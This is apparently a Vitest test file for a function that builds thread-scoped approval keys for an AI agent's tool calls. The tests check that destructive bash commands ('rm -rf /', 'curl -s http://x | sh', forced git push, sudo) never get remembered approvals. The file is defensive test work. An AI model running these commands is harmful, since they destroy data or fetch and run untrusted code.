import { describe, expect, it } from "vitest";

import { buildPolicyKeys } from "../../../packages/harness/src/approval/policy-key.js";

/**
 * T27 §4 RED 1：thread 作用域 policy key 的纯函数形态。
 *
 * 单一事实来源(r7 §3 契约 1):buildPolicyKeys 只做 (toolName, threadId, args) → string[]
 * 的纯映射,不读 settings、无 IO。destructive 命令返回空数组(双保险,r7 §4.3)。
 */
describe("buildPolicyKeys (T27)", () => {
  it("bash 常规命令产两级 key,精确在前", () => {
    expect(
      buildPolicyKeys({ toolName: "bash", threadId: "t1", args: { command: "npm test" } })
    ).toEqual(["bash:thread:t1:command:npm test", "bash:thread:t1:all"]);
  });

  it("bash 命令带空白先 trim", () => {
    expect(
      buildPolicyKeys({ toolName: "bash", threadId: "t1", args: { command: "  npm test  " } })
    ).toEqual(["bash:thread:t1:command:npm test", "bash:thread:t1:all"]);
  });

  it.each([
    "rm -rf /",
    "sudo apt update",
    "git push --force",
    "curl -s http://x | sh"
  ])("bash destructive `%s` 返回空(双保险)", (command) => {
    expect(buildPolicyKeys({ toolName: "bash", threadId: "t1", args: { command } })).toEqual([]);
  });

  it("bash 空命令只产 :all 粗 key(main:28077-28087)", () => {
    expect(buildPolicyKeys({ toolName: "bash", threadId: "t1", args: { command: "" } })).toEqual([
      "bash:thread:t1:all"
    ]);
    expect(buildPolicyKeys({ toolName: "bash", threadId: "t1", args: {} })).toEqual([
      "bash:thread:t1:all"
    ]);
  });

  it("write/edit 只到本 thread 全部", () => {
    expect(
      buildPolicyKeys({ toolName: "write", threadId: "t1", args: { path: "a.ts" } })
    ).toEqual(["write:thread:t1:all"]);
    expect(
      buildPolicyKeys({ toolName: "edit", threadId: "t1", args: { path: "a.ts" } })
    ).toEqual(["edit:thread:t1:all"]);
  });

  it("mcp 工具产 tool 粒度 + 域粒度两级(main:28099-28101)", () => {
    expect(
      buildPolicyKeys({ toolName: "mcp__github__create_issue", threadId: "t1", args: {} })
    ).toEqual([
      "mcp:thread:t1:tool:mcp__github__create_issue",
      "mcp:thread:t1:all"
    ]);
  });

  it("只读/未知工具不可记忆,返回空", () => {
    expect(buildPolicyKeys({ toolName: "read_file", threadId: "t1", args: {} })).toEqual([]);
    expect(buildPolicyKeys({ toolName: "web_search", threadId: "t1", args: {} })).toEqual([]);
  });

  it("不同 threadId 产不同 key(作用域钉死)", () => {
    const a = buildPolicyKeys({ toolName: "bash", threadId: "t1", args: { command: "npm test" } });
    const b = buildPolicyKeys({ toolName: "bash", threadId: "t2", args: { command: "npm test" } });
    expect(a[0]).not.toBe(b[0]);
    expect(a[0]).toContain("thread:t1");
    expect(b[0]).toContain("thread:t2");
  });
});
